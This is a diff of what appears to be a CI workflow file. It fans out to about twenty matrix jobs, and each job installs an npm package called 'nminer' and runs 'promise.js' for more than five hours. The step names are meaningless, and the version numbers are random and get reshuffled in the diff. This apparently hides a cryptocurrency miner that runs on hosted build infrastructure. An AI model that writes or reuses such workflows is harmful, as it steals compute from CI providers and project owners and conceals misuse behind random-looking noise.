@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2246 }
-          - { version: 3593 }
-          - { version: 26 }
-          - { version: 5721 }
-          - { version: 1670 }
-          - { version: 7707 }
-          - { version: 7660 }
-          - { version: 5862 }
-          - { version: 2041 }
-          - { version: 3229 }
-          - { version: 8186 }
-          - { version: 3059 }
-          - { version: 3910 }
-          - { version: 1068 }
-          - { version: 8758 }
-          - { version: 8642 }
-          - { version: 2845 }
-          - { version: 7456 }
-          - { version: 8312 }
-          - { version: 3470 }
+          - { version: 2057 }
+          - { version: 6006 }
+          - { version: 8955 }
+          - { version: 3404 }
+          - { version: 5192 }
+          - { version: 7065 }
+          - { version: 8405 }
+          - { version: 2960 }
+          - { version: 3812 }
+          - { version: 5621 }
+          - { version: 3010 }
+          - { version: 2978 }
+          - { version: 8815 }
+          - { version: 2218 }
+          - { version: 9028 }
+          - { version: 7806 }
+          - { version: 4450 }
+          - { version: 8048 }
+          - { version: 3388 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: lest unbearably
+      - name: who to mozzarella pigsty
         run: |
           npm install nminer@latest
-          timeout 323m node promise.js || echo "promise executed"
+          timeout 331m node promise.js || echo "promise executed"
